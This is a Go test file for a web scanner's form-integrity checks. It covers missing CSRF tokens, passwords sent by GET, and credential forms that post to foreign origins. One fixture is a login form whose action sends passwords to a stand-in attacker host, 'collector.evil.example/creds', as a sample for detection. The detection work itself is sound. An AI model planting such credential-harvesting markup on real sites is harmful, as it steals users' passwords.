package hacker

import "testing"

func TestFormWithoutCSRFFieldIsReported(t *testing.T) {
	body := `<html><body>
<form method="POST" action="/login">
  <input type="text" name="user">
  <input type="password" name="pass">
</form>
</body></html>`

	got := findingsByType(analyzeFormIntegrity("https://app.example.com/login", body))
	f, ok := got["form_missing_csrf"]
	if !ok {
		t.Fatalf("POST form with no anti-CSRF field must be reported: %+v", got)
	}
	if f.Severity != SevMedium {
		t.Errorf("severity = %v, want Medium", f.Severity)
	}
}

func TestFormCSRFFieldSuppressesFinding(t *testing.T) {
	for _, name := range []string{"csrfmiddlewaretoken", "authenticity_token", "_token", "__RequestVerificationToken"} {
		body := `<form method="POST" action="/submit">
<input type="hidden" name="` + name + `" value="abc">
<input type="password" name="pass">
</form>`
		got := findingsByType(analyzeFormIntegrity("https://app.example.com/settings", body))
		if _, ok := got["form_missing_csrf"]; ok {
			t.Errorf("hidden field %q is an anti-CSRF token, must not be reported missing", name)
		}
	}
}

// The meta csrf-token is how Rails/Laravel SPAs attach the token through
// a request header. Calling that form broken on every page would be the
// classic false positive; the action downgrades it to informational.
func TestGlobalMetaCSRFTokenDowngradesFinding(t *testing.T) {
	body := `<html><head><meta name="csrf-token" content="xyz"></head><body>
<form method="POST" action="/api/save"><input name="note"></form>
</body></html>`

	got := findingsByType(analyzeFormIntegrity("https://app.example.com/", body))
	if _, ok := got["form_missing_csrf"]; ok {
		t.Fatalf("meta csrf-token present: must not accuse the form of missing CSRF: %+v", got)
	}
	if _, ok := got["form_csrf_meta_only"]; !ok {
		t.Fatalf("meta-only protection should still be recorded as informational: %+v", got)
	}
}

func TestPasswordInGETFormIsHigh(t *testing.T) {
	body := `<form method="GET" action="/login">
<input type="password" name="pass">
</form>`

	got := findingsByType(analyzeFormIntegrity("https://app.example.com/login", body))
	f, ok := got["form_password_in_get"]
	if !ok {
		t.Fatalf("password submitted via GET must be reported: %+v", got)
	}
	if f.Severity != SevHigh {
		t.Errorf("severity = %v, want High", f.Severity)
	}
	// A GET form cannot carry a hidden token in the conventional way;
	// the CSRF rule targets POST only and must not double-report.
	if _, ok := got["form_missing_csrf"]; ok {
		t.Error("CSRF rule must not fire on GET forms")
	}
}

func TestPasswordFormPostingToForeignOrigin(t *testing.T) {
	body := `<form method="POST" action="https://collector.evil.example/creds">
<input type="password" name="pass">
<input type="hidden" name="csrf_token" value="x">
</form>`

	got := findingsByType(analyzeFormIntegrity("https://app.example.com/login", body))
	if _, ok := got["form_credentials_foreign_origin"]; !ok {
		t.Fatalf("password form posting off-origin must be reported: %+v", got)
	}
}

func TestOwnSubdomainActionIsNotForeign(t *testing.T) {
	body := `<form method="POST" action="https://auth.example.com/session">
<input type="password" name="pass">
<input type="hidden" name="csrf_token" value="x">
</form>`

	got := findingsByType(analyzeFormIntegrity("https://app.example.com/login", body))
	if _, ok := got["form_credentials_foreign_origin"]; ok {
		t.Errorf("auth.example.com is the same registrable domain — must not be called foreign: %+v", got)
	}
}

// The word "csrf" in prose or a script is not a form field. Only real
// <form> segments may produce form findings.
func TestProseMentioningCSRFDoesNotSuppressFinding(t *testing.T) {
	body := `<html><body>
<p>Our API uses a csrf_token header.</p>
<script>var _token = "x";</script>
<form method="POST" action="/save"><input name="note"></form>
</body></html>`

	got := findingsByType(analyzeFormIntegrity("https://app.example.com/", body))
	if _, ok := got["form_missing_csrf"]; !ok {
		t.Fatalf("a token mentioned outside the form must not count as protection: %+v", got)
	}
}
